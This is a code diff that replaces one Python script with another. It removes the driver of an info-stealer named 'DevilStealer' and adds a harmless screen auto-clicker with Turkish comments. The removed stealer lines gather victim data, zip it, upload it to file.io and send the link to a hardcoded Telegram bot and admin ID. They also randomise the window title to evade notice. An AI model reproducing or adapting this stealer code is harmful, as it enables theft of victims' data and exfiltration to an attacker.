@@ -1,43 +1,45 @@
-import os
-import telebot
-import requests
-import stealer
-from telebot import types
-import string
-import random
+import pyautogui
+import time
+import keyboard
 
-ADMIN_ID = "705682164" # Your telegram id
-FILE_IO_API_URL = "https://file.io"
+button_image = "buton.png"   # Aranacak butonun ekran görüntüsü
+click_count = 1              # Her butona kaç kere tıklasın
+click_interval = 0.3         # Tıklamalar arası bekleme süresi (sn)
 
-bot = telebot.TeleBot("8029240133:AAHK2M_-9-KEvhxKv_ywt4UWJ0HGYk5HvHI")
+print("⏳ 3 saniye içinde sayfayı hazırla...")
+time.sleep(3)
 
-rand_title = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
-os.system(f"title {rand_title}")
+print("🔍 Program başladı. Sol Shift = dur/başlat, ESC = çıkış")
 
-def upload_to_fileio(archive_path):
-    with open(archive_path, "rb") as file:
-        response = requests.post(FILE_IO_API_URL, files={"file": file})
-        response_data = response.json()
-        file.close()
-        return response_data.get("link")
+running = True  # Başlangıçta açık
 
-def send_to_tg(archive_path):
-    file_io_link = upload_to_fileio(archive_path)
-    lnkkb = types.InlineKeyboardMarkup()
-    btn = types.InlineKeyboardButton(text="😈 Скачать логи", url=file_io_link)
-    lnkkb.add(btn)
-    bot.send_message(ADMIN_ID, "DevilStealer>>> Пришла новинка", reply_markup=lnkkb)
+while True:
+    # ESC → çıkış
+    if keyboard.is_pressed("esc"):
+        print("🛑 Program kullanıcı tarafından kapatıldı.")
+        break
 
+    # Shift → toggle başlat/durdur
+    if keyboard.is_pressed("shift"):
+        running = not running
+        state = "devam ediyor" if running else "durdu"
+        print(f"⏸ Toggle: Click işlemi {state}.")
+        time.sleep(0.5)  # tuş tekrarı önlemek için bekleme
 
-def main():
-    stealer.steal_all()
-    arch = stealer.create_zip_archive()
-    if arch:
-        send_to_tg(stealer.ZIP_PATH)
-        stealer.delFolder()
-        bot.stop_polling()
-        exit(0)
+    if not running:
+        time.sleep(0.2)
+        continue
 
-if __name__ == "__main__":
-    main()
-    bot.polling(none_stop=True)
+    matches = list(pyautogui.locateAllOnScreen(button_image, confidence=0.8))
+
+    if not matches:
+        print("❌ Buton bulunamadı, sayfayı biraz kaydır...")
+        time.sleep(1)
+        continue
+
+    for match in matches:
+        center = pyautogui.center(match)
+        for c in range(click_count):
+            pyautogui.click(center)
+            print(f"✅ Butona tıklandı: {center} ({c+1}. click)")
+            time.sleep(click_interval)
